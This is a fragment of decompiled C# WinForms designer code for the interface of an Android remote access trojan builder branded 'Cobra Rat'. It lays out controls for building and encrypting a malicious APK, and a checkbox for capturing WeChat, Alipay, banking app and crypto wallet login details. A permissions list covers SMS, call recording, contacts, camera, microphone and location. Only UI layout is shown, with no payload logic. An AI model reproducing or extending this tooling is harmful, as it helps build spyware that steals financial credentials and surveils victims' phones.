		this.removmonitor.Location = new System.Drawing.Point(390, 277);
		this.removmonitor.Margin = new System.Windows.Forms.Padding(4);
		this.removmonitor.Name = "removmonitor";
		this.removmonitor.Size = new System.Drawing.Size(35, 30);
		this.removmonitor.Style = DrakeUI.Framework.UIStyle.Custom;
		this.removmonitor.Symbol = 61526;
		this.removmonitor.SymbolSize = 30;
		this.removmonitor.TabIndex = 102;
		this.removmonitor.Text = "DrakeUIAvatar1";
		this.addmintor.AvatarSize = 30;
		this.addmintor.BackColor = System.Drawing.Color.Transparent;
		this.addmintor.Cursor = System.Windows.Forms.Cursors.Hand;
		this.addmintor.FillColor = System.Drawing.Color.Transparent;
		this.addmintor.Font = new System.Drawing.Font("Calibri", 12f);
		this.addmintor.ForeColor = System.Drawing.Color.SkyBlue;
		this.addmintor.Location = new System.Drawing.Point(390, 192);
		this.addmintor.Margin = new System.Windows.Forms.Padding(4);
		this.addmintor.Name = "addmintor";
		this.addmintor.Size = new System.Drawing.Size(35, 30);
		this.addmintor.Style = DrakeUI.Framework.UIStyle.Custom;
		this.addmintor.Symbol = 61525;
		this.addmintor.SymbolSize = 30;
		this.addmintor.TabIndex = 101;
		this.addmintor.Text = "DrakeUIAvatar1";
		this.listmonitor.BackColor = System.Drawing.Color.FromArgb(20, 31, 20);
		this.listmonitor.FillColor = System.Drawing.Color.FromArgb(20, 31, 20);
		this.listmonitor.FillDisableColor = System.Drawing.Color.FromArgb(20, 31, 20);
		this.listmonitor.Font = new System.Drawing.Font("Calibri", 12f);
		this.listmonitor.ForeColor = System.Drawing.Color.Black;
		this.listmonitor.HoverColor = System.Drawing.Color.Silver;
		this.listmonitor.ItemHeight = 30;
		this.listmonitor.ItemSelectBackColor = System.Drawing.Color.FromArgb(140, 140, 140);
		this.listmonitor.ItemSelectForeColor = System.Drawing.Color.SkyBlue;
		this.listmonitor.Location = new System.Drawing.Point(461, 90);
		this.listmonitor.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.listmonitor.Name = "listmonitor";
		this.listmonitor.Padding = new System.Windows.Forms.Padding(7);
		this.listmonitor.Radius = 15;
		this.listmonitor.RectColor = System.Drawing.Color.SkyBlue;
		this.listmonitor.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.listmonitor.Size = new System.Drawing.Size(481, 328);
		this.listmonitor.Style = DrakeUI.Framework.UIStyle.Custom;
		this.listmonitor.StyleCustomMode = true;
		this.listmonitor.TabIndex = 97;
		this.listmonitor.Text = null;
		this.namemonitor.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.namemonitor.FillColor = System.Drawing.Color.Black;
		this.namemonitor.Font = new System.Drawing.Font("Calibri", 12f);
		this.namemonitor.ForeColor = System.Drawing.Color.SkyBlue;
		this.namemonitor.Location = new System.Drawing.Point(95, 147);
		this.namemonitor.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.namemonitor.Maximum = 2147483647.0;
		this.namemonitor.Minimum = -2147483648.0;
		this.namemonitor.Name = "namemonitor";
		this.namemonitor.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.namemonitor.Radius = 10;
		this.namemonitor.RectColor = System.Drawing.Color.SkyBlue;
		this.namemonitor.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.namemonitor.Size = new System.Drawing.Size(262, 27);
		this.namemonitor.Style = DrakeUI.Framework.UIStyle.Custom;
		this.namemonitor.TabIndex = 94;
		this.namemonitor.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.namemonitor.Watermark = "Website Name : Cobra Rat";
		this.idmonitor.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.idmonitor.FillColor = System.Drawing.Color.Black;
		this.idmonitor.Font = new System.Drawing.Font("Calibri", 12f);
		this.idmonitor.ForeColor = System.Drawing.Color.Green;
		this.idmonitor.Location = new System.Drawing.Point(95, 323);
		this.idmonitor.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.idmonitor.Maximum = 2147483647.0;
		this.idmonitor.Minimum = -2147483648.0;
		this.idmonitor.Name = "idmonitor";
		this.idmonitor.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.idmonitor.Radius = 10;
		this.idmonitor.RectColor = System.Drawing.Color.SkyBlue;
		this.idmonitor.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.idmonitor.Size = new System.Drawing.Size(262, 27);
		this.idmonitor.Style = DrakeUI.Framework.UIStyle.Custom;
		this.idmonitor.TabIndex = 96;
		this.idmonitor.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.idmonitor.Watermark = "Package ID (optional)";
		this.linkmonitor.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.linkmonitor.FillColor = System.Drawing.Color.Black;
		this.linkmonitor.Font = new System.Drawing.Font("Calibri", 12f);
		this.linkmonitor.ForeColor = System.Drawing.Color.SkyBlue;
		this.linkmonitor.Location = new System.Drawing.Point(95, 235);
		this.linkmonitor.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.linkmonitor.Maximum = 2147483647.0;
		this.linkmonitor.Minimum = -2147483648.0;
		this.linkmonitor.Name = "linkmonitor";
		this.linkmonitor.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.linkmonitor.Radius = 10;
		this.linkmonitor.RectColor = System.Drawing.Color.SkyBlue;
		this.linkmonitor.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.linkmonitor.Size = new System.Drawing.Size(262, 27);
		this.linkmonitor.Style = DrakeUI.Framework.UIStyle.Custom;
		this.linkmonitor.TabIndex = 95;
		this.linkmonitor.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.linkmonitor.Watermark = "Website link : t.me/CobraRat";
		this.Panel10.Controls.Add(this.Label18);
		this.Panel10.Controls.Add(this.Label15);
		this.Panel10.Controls.Add(this.checkcaptureonce);
		this.Panel10.Controls.Add(this.checkcatpure);
		this.Panel10.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel10.Location = new System.Drawing.Point(0, 0);
		this.Panel10.Name = "Panel10";
		this.Panel10.Size = new System.Drawing.Size(450, 119);
		this.Panel10.TabIndex = 99;
		this.Label18.AutoSize = true;
		this.Label18.BackColor = System.Drawing.Color.Transparent;
		this.Label18.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label18.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label18.Location = new System.Drawing.Point(57, 71);
		this.Label18.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label18.Name = "Label18";
		this.Label18.Size = new System.Drawing.Size(16, 19);
		this.Label18.TabIndex = 80;
		this.Label18.Text = "*";
		this.Label15.AutoSize = true;
		this.Label15.BackColor = System.Drawing.Color.Transparent;
		this.Label15.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label15.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label15.Location = new System.Drawing.Point(57, 31);
		this.Label15.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label15.Name = "Label15";
		this.Label15.Size = new System.Drawing.Size(16, 19);
		this.Label15.TabIndex = 79;
		this.Label15.Text = "*";
		this.checkcaptureonce.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkcaptureonce.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkcaptureonce.Enabled = false;
		this.checkcaptureonce.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkcaptureonce.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkcaptureonce.Location = new System.Drawing.Point(95, 66);
		this.checkcaptureonce.Name = "checkcaptureonce";
		this.checkcaptureonce.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkcaptureonce.Size = new System.Drawing.Size(196, 29);
		this.checkcaptureonce.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkcaptureonce.TabIndex = 78;
		this.checkcaptureonce.Text = "Capture one Login Info";
		this.checkcaptureonce.TextAlign = System.Drawing.ContentAlignment.TopCenter;
		this.checkcatpure.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkcatpure.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkcatpure.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkcatpure.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkcatpure.Location = new System.Drawing.Point(95, 31);
		this.checkcatpure.Name = "checkcatpure";
		this.checkcatpure.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkcatpure.Size = new System.Drawing.Size(464, 29);
		this.checkcatpure.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkcatpure.TabIndex = 77;
		this.checkcatpure.Text = "Capture WeChat/Alipay/Banking App/Crypto Wallet Login Info";
		this.checkcatpure.TextAlign = System.Drawing.ContentAlignment.TopCenter;
		this.TabPage14.BackColor = System.Drawing.Color.SkyBlue;
		this.TabPage14.Controls.Add(this.TextBox1);
		this.TabPage14.Controls.Add(this.Panel9);
		this.TabPage14.Controls.Add(this.Panel8);
		this.TabPage14.Controls.Add(this.Panel1);
		this.TabPage14.Location = new System.Drawing.Point(0, 40);
		this.TabPage14.Name = "TabPage14";
		this.TabPage14.Size = new System.Drawing.Size(450, 230);
		this.TabPage14.TabIndex = 6;
		this.TabPage14.Text = "Build";
		this.TextBox1.BackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.TextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.TextBox1.Font = new System.Drawing.Font("Calibri", 12f);
		this.TextBox1.ForeColor = System.Drawing.Color.SkyBlue;
		this.TextBox1.Location = new System.Drawing.Point(326, 33);
		this.TextBox1.Margin = new System.Windows.Forms.Padding(4);
		this.TextBox1.Multiline = true;
		this.TextBox1.Name = "TextBox1";
		this.TextBox1.ReadOnly = true;
		this.TextBox1.Size = new System.Drawing.Size(124, 163);
		this.TextBox1.TabIndex = 48;
		this.Panel9.BackColor = System.Drawing.Color.Black;
		this.Panel9.Controls.Add(this.DrakeUIAvatar1);
		this.Panel9.Controls.Add(this.DrakeUIAvatar2);
		this.Panel9.Controls.Add(this.trackIDtext);
		this.Panel9.Controls.Add(this.Generaltext);
		this.Panel9.Controls.Add(this.tracklist);
		this.Panel9.Controls.Add(this.trakertitle);
		this.Panel9.Controls.Add(this.Label8);
		this.Panel9.Controls.Add(this.Primslist);
		this.Panel9.Controls.Add(this.removeactiv);
		this.Panel9.Controls.Add(this.CheckAllPrims);
		this.Panel9.Controls.Add(this.addactiv);
		this.Panel9.Controls.Add(this.comboproms);
		this.Panel9.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel9.Location = new System.Drawing.Point(0, 33);
		this.Panel9.Name = "Panel9";
		this.Panel9.Size = new System.Drawing.Size(326, 163);
		this.Panel9.TabIndex = 105;
		this.DrakeUIAvatar1.AvatarSize = 30;
		this.DrakeUIAvatar1.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar1.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar1.ForeColor = System.Drawing.Color.White;
		this.DrakeUIAvatar1.Location = new System.Drawing.Point(54, 346);
		this.DrakeUIAvatar1.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIAvatar1.Name = "DrakeUIAvatar1";
		this.DrakeUIAvatar1.Size = new System.Drawing.Size(35, 30);
		this.DrakeUIAvatar1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar1.Symbol = 61526;
		this.DrakeUIAvatar1.SymbolSize = 30;
		this.DrakeUIAvatar1.TabIndex = 107;
		this.DrakeUIAvatar1.Text = "DrakeUIAvatar1";
		this.DrakeUIAvatar2.AvatarSize = 30;
		this.DrakeUIAvatar2.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar2.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar2.ForeColor = System.Drawing.Color.White;
		this.DrakeUIAvatar2.Location = new System.Drawing.Point(11, 346);
		this.DrakeUIAvatar2.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIAvatar2.Name = "DrakeUIAvatar2";
		this.DrakeUIAvatar2.Size = new System.Drawing.Size(35, 30);
		this.DrakeUIAvatar2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar2.Symbol = 61525;
		this.DrakeUIAvatar2.SymbolSize = 30;
		this.DrakeUIAvatar2.TabIndex = 106;
		this.DrakeUIAvatar2.Text = "DrakeUIAvatar1";
		this.trackIDtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.trackIDtext.FillColor = System.Drawing.Color.Black;
		this.trackIDtext.Font = new System.Drawing.Font("Calibri", 10f);
		this.trackIDtext.ForeColor = System.Drawing.Color.SkyBlue;
		this.trackIDtext.Location = new System.Drawing.Point(124, 350);
		this.trackIDtext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.trackIDtext.Maximum = 2147483647.0;
		this.trackIDtext.Minimum = -2147483648.0;
		this.trackIDtext.Name = "trackIDtext";
		this.trackIDtext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.trackIDtext.Radius = 10;
		this.trackIDtext.RectColor = System.Drawing.Color.SkyBlue;
		this.trackIDtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.trackIDtext.Size = new System.Drawing.Size(191, 24);
		this.trackIDtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.trackIDtext.TabIndex = 105;
		this.trackIDtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.trackIDtext.Watermark = "Package ID";
		this.Generaltext.FillColor = System.Drawing.Color.Black;
		this.Generaltext.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.Generaltext.ForeColor = System.Drawing.Color.SkyBlue;
		this.Generaltext.LineColor = System.Drawing.Color.SkyBlue;
		this.Generaltext.Location = new System.Drawing.Point(11, 276);
		this.Generaltext.MinimumSize = new System.Drawing.Size(2, 2);
		this.Generaltext.Name = "Generaltext";
		this.Generaltext.Size = new System.Drawing.Size(304, 25);
		this.Generaltext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Generaltext.TabIndex = 104;
		this.Generaltext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.tracklist.BackColor = System.Drawing.Color.FromArgb(20, 31, 20);
		this.tracklist.FillColor = System.Drawing.Color.FromArgb(20, 31, 20);
		this.tracklist.FillDisableColor = System.Drawing.Color.FromArgb(20, 31, 20);
		this.tracklist.Font = new System.Drawing.Font("Calibri", 12f);
		this.tracklist.ForeColor = System.Drawing.Color.Black;
		this.tracklist.HoverColor = System.Drawing.Color.Silver;
		this.tracklist.ItemSelectBackColor = System.Drawing.Color.FromArgb(140, 140, 140);
		this.tracklist.ItemSelectForeColor = System.Drawing.Color.SkyBlue;
		this.tracklist.Location = new System.Drawing.Point(16, 389);
		this.tracklist.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tracklist.Name = "tracklist";
		this.tracklist.Padding = new System.Windows.Forms.Padding(7);
		this.tracklist.Radius = 15;
		this.tracklist.RectColor = System.Drawing.Color.SkyBlue;
		this.tracklist.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.tracklist.Size = new System.Drawing.Size(299, 189);
		this.tracklist.Style = DrakeUI.Framework.UIStyle.Custom;
		this.tracklist.StyleCustomMode = true;
		this.tracklist.TabIndex = 103;
		this.tracklist.Text = null;
		this.trakertitle.AutoSize = true;
		this.trakertitle.BackColor = System.Drawing.Color.Transparent;
		this.trakertitle.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.trakertitle.ForeColor = System.Drawing.Color.SkyBlue;
		this.trakertitle.Location = new System.Drawing.Point(12, 320);
		this.trakertitle.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.trakertitle.Name = "trakertitle";
		this.trakertitle.Size = new System.Drawing.Size(87, 19);
		this.trakertitle.TabIndex = 102;
		this.trakertitle.Text = "Tracking list";
		this.Label8.AutoSize = true;
		this.Label8.BackColor = System.Drawing.Color.Transparent;
		this.Label8.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label8.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label8.Location = new System.Drawing.Point(12, 18);
		this.Label8.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label8.Name = "Label8";
		this.Label8.Size = new System.Drawing.Size(111, 19);
		this.Label8.TabIndex = 101;
		this.Label8.Text = "Permissions list";
		this.Primslist.BackColor = System.Drawing.Color.FromArgb(20, 31, 20);
		this.Primslist.FillColor = System.Drawing.Color.FromArgb(20, 31, 20);
		this.Primslist.FillDisableColor = System.Drawing.Color.FromArgb(20, 31, 20);
		this.Primslist.Font = new System.Drawing.Font("Calibri", 12f);
		this.Primslist.ForeColor = System.Drawing.Color.Black;
		this.Primslist.HoverColor = System.Drawing.Color.Silver;
		this.Primslist.ItemSelectBackColor = System.Drawing.Color.FromArgb(140, 140, 140);
		this.Primslist.ItemSelectForeColor = System.Drawing.Color.SkyBlue;
		this.Primslist.Location = new System.Drawing.Point(16, 97);
		this.Primslist.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.Primslist.Name = "Primslist";
		this.Primslist.Padding = new System.Windows.Forms.Padding(7);
		this.Primslist.Radius = 15;
		this.Primslist.RectColor = System.Drawing.Color.SkyBlue;
		this.Primslist.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.Primslist.Size = new System.Drawing.Size(299, 171);
		this.Primslist.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Primslist.StyleCustomMode = true;
		this.Primslist.TabIndex = 24;
		this.Primslist.Text = null;
		this.removeactiv.AvatarSize = 30;
		this.removeactiv.BackColor = System.Drawing.Color.Transparent;
		this.removeactiv.Cursor = System.Windows.Forms.Cursors.Hand;
		this.removeactiv.FillColor = System.Drawing.Color.Transparent;
		this.removeactiv.Font = new System.Drawing.Font("Calibri", 12f);
		this.removeactiv.ForeColor = System.Drawing.Color.SkyBlue;
		this.removeactiv.Location = new System.Drawing.Point(54, 46);
		this.removeactiv.Margin = new System.Windows.Forms.Padding(4);
		this.removeactiv.Name = "removeactiv";
		this.removeactiv.Size = new System.Drawing.Size(35, 30);
		this.removeactiv.Style = DrakeUI.Framework.UIStyle.Custom;
		this.removeactiv.Symbol = 61526;
		this.removeactiv.SymbolSize = 30;
		this.removeactiv.TabIndex = 100;
		this.removeactiv.Text = "DrakeUIAvatar1";
		this.CheckAllPrims.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckAllPrims.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckAllPrims.Font = new System.Drawing.Font("Calibri", 12f);
		this.CheckAllPrims.ForeColor = System.Drawing.Color.SkyBlue;
		this.CheckAllPrims.Location = new System.Drawing.Point(267, 51);
		this.CheckAllPrims.Name = "CheckAllPrims";
		this.CheckAllPrims.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckAllPrims.Size = new System.Drawing.Size(64, 26);
		this.CheckAllPrims.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CheckAllPrims.StyleCustomMode = true;
		this.CheckAllPrims.TabIndex = 71;
		this.CheckAllPrims.Text = "All";
		this.addactiv.AvatarSize = 30;
		this.addactiv.BackColor = System.Drawing.Color.Transparent;
		this.addactiv.Cursor = System.Windows.Forms.Cursors.Hand;
		this.addactiv.FillColor = System.Drawing.Color.Transparent;
		this.addactiv.Font = new System.Drawing.Font("Calibri", 12f);
		this.addactiv.ForeColor = System.Drawing.Color.SkyBlue;
		this.addactiv.Location = new System.Drawing.Point(11, 46);
		this.addactiv.Margin = new System.Windows.Forms.Padding(4);
		this.addactiv.Name = "addactiv";
		this.addactiv.Size = new System.Drawing.Size(35, 30);
		this.addactiv.Style = DrakeUI.Framework.UIStyle.Custom;
		this.addactiv.Symbol = 61525;
		this.addactiv.SymbolSize = 30;
		this.addactiv.TabIndex = 99;
		this.addactiv.Text = "DrakeUIAvatar1";
		this.comboproms.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comboproms.FillColor = System.Drawing.Color.Black;
		this.comboproms.Font = new System.Drawing.Font("Calibri", 11f);
		this.comboproms.ForeColor = System.Drawing.Color.SkyBlue;
		this.comboproms.Items.AddRange(new object[11]
		{
			"Send SMS", "Record Calls", "WeChat/Alipay Logs", "Read SMS", "Read Call Logs", "Read Contacts", "Read Accounts", "Camera", "Microphone", "Location",
			"Make Calls"
		});
		this.comboproms.Location = new System.Drawing.Point(102, 52);
		this.comboproms.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.comboproms.MinimumSize = new System.Drawing.Size(63, 0);
		this.comboproms.Name = "comboproms";
		this.comboproms.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comboproms.RectColor = System.Drawing.Color.SkyBlue;
		this.comboproms.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comboproms.Size = new System.Drawing.Size(158, 25);
		this.comboproms.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comboproms.TabIndex = 26;
		this.comboproms.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel8.BackColor = System.Drawing.Color.Black;
		this.Panel8.Controls.Add(this.Label39);
		this.Panel8.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel8.Location = new System.Drawing.Point(0, 0);
		this.Panel8.Name = "Panel8";
		this.Panel8.Size = new System.Drawing.Size(450, 33);
		this.Panel8.TabIndex = 50;
		this.Label39.Dock = System.Windows.Forms.DockStyle.Right;
		this.Label39.Font = new System.Drawing.Font("Calibri", 9f);
		this.Label39.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label39.Location = new System.Drawing.Point(-30, 0);
		this.Label39.Name = "Label39";
		this.Label39.Size = new System.Drawing.Size(480, 33);
		this.Label39.TabIndex = 0;
		this.Label39.Text = "Progress";
		this.Label39.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Label39.Visible = false;
		this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Controls.Add(this.checkprotector);
		this.Panel1.Controls.Add(this.Label19);
		this.Panel1.Controls.Add(this.checkver);
		this.Panel1.Controls.Add(this.Label48);
		this.Panel1.Controls.Add(this.SelectedApk);
		this.Panel1.Controls.Add(this.checksignver);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel1.Location = new System.Drawing.Point(0, 196);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(450, 34);
		this.Panel1.TabIndex = 104;
		this.checkprotector.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkprotector.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkprotector.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkprotector.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkprotector.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkprotector.Location = new System.Drawing.Point(600, 0);
		this.checkprotector.Name = "checkprotector";
		this.checkprotector.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkprotector.Size = new System.Drawing.Size(168, 34);
		this.checkprotector.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkprotector.TabIndex = 72;
		this.checkprotector.Text = "Encrypt Apk v3";
		this.checkprotector.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Label19.BackColor = System.Drawing.Color.Transparent;
		this.Label19.Dock = System.Windows.Forms.DockStyle.Left;
		this.Label19.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label19.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label19.Location = new System.Drawing.Point(428, 0);
		this.Label19.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label19.Name = "Label19";
		this.Label19.Size = new System.Drawing.Size(172, 34);
		this.Label19.TabIndex = 60;
		this.Label19.Text = "APK Version";
		this.Label19.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkver.AllowDrop = true;
		this.checkver.BackColor = System.Drawing.Color.Transparent;
		this.checkver.CausesValidation = false;
		this.checkver.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkver.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.checkver.FillColor = System.Drawing.Color.Black;
		this.checkver.Font = new System.Drawing.Font("Calibri", 11f);
		this.checkver.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkver.FormattingEnabled = true;
		this.checkver.ItemHeight = 20;
		this.checkver.Items.AddRange(new object[3] { "V1", "V2", "V3" });
		this.checkver.Location = new System.Drawing.Point(318, 0);
		this.checkver.Margin = new System.Windows.Forms.Padding(4);
		this.checkver.MinimumSize = new System.Drawing.Size(63, 0);
		this.checkver.Name = "checkver";
		this.checkver.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.checkver.RectColor = System.Drawing.Color.SkyBlue;
		this.checkver.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.checkver.Size = new System.Drawing.Size(110, 25);
		this.checkver.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkver.TabIndex = 59;
		this.checkver.Text = "V3";
		this.checkver.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Label48.BackColor = System.Drawing.Color.Transparent;
		this.Label48.Dock = System.Windows.Forms.DockStyle.Left;
		this.Label48.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label48.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label48.Location = new System.Drawing.Point(110, 0);
		this.Label48.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label48.Name = "Label48";
		this.Label48.Size = new System.Drawing.Size(208, 34);
		this.Label48.TabIndex = 103;
		this.Label48.Text = "Signature Version";
		this.Label48.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.SelectedApk.BackColor = System.Drawing.Color.Transparent;
		this.SelectedApk.Cursor = System.Windows.Forms.Cursors.Hand;
		this.SelectedApk.Dock = System.Windows.Forms.DockStyle.Right;
		this.SelectedApk.FillColor = System.Drawing.Color.Transparent;
		this.SelectedApk.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.SelectedApk.FillPressColor = System.Drawing.Color.Black;
		this.SelectedApk.FillSelectedColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.SelectedApk.Font = new System.Drawing.Font("Calibri", 12f);
		this.SelectedApk.ForeColor = System.Drawing.Color.SkyBlue;
		this.SelectedApk.ForePressColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.SelectedApk.Location = new System.Drawing.Point(294, 0);
		this.SelectedApk.Margin = new System.Windows.Forms.Padding(4);
		this.SelectedApk.Name = "SelectedApk";
		this.SelectedApk.Radius = 10;
		this.SelectedApk.RectColor = System.Drawing.Color.SkyBlue;
		this.SelectedApk.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.SelectedApk.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.SelectedApk.RectPressColor = System.Drawing.Color.SkyBlue;
		this.SelectedApk.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.SelectedApk.Size = new System.Drawing.Size(156, 34);
		this.SelectedApk.Style = DrakeUI.Framework.UIStyle.Custom;
		this.SelectedApk.SymbolSize = 0;
		this.SelectedApk.TabIndex = 98;
		this.SelectedApk.Text = "Create ApK";
		this.checksignver.AllowDrop = true;
		this.checksignver.BackColor = System.Drawing.Color.Transparent;
		this.checksignver.CausesValidation = false;
		this.checksignver.Dock = System.Windows.Forms.DockStyle.Left;
		this.checksignver.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.checksignver.FillColor = System.Drawing.Color.Black;
		this.checksignver.Font = new System.Drawing.Font("Calibri", 11f);
		this.checksignver.ForeColor = System.Drawing.Color.SkyBlue;
		this.checksignver.FormattingEnabled = true;
		this.checksignver.ItemHeight = 20;
		this.checksignver.Items.AddRange(new object[3] { "V1", "V2", "V3" });
		this.checksignver.Location = new System.Drawing.Point(0, 0);
		this.checksignver.Margin = new System.Windows.Forms.Padding(4);
		this.checksignver.MinimumSize = new System.Drawing.Size(63, 0);
		this.checksignver.Name = "checksignver";
		this.checksignver.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.checksignver.RectColor = System.Drawing.Color.SkyBlue;
		this.checksignver.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.checksignver.Size = new System.Drawing.Size(110, 25);
		this.checksignver.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checksignver.TabIndex = 102;
		this.checksignver.Text = "V3";
		this.checksignver.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.FilePathApk.FileName = "OpenFileDialog1";
		this.TOpacity.Interval = 1;
		this.startTime.Interval = 500;
		this.ToolTip1.AutoPopDelay = 5000;
		this.ToolTip1.InitialDelay = 1000;
		this.ToolTip1.ReshowDelay = 100;
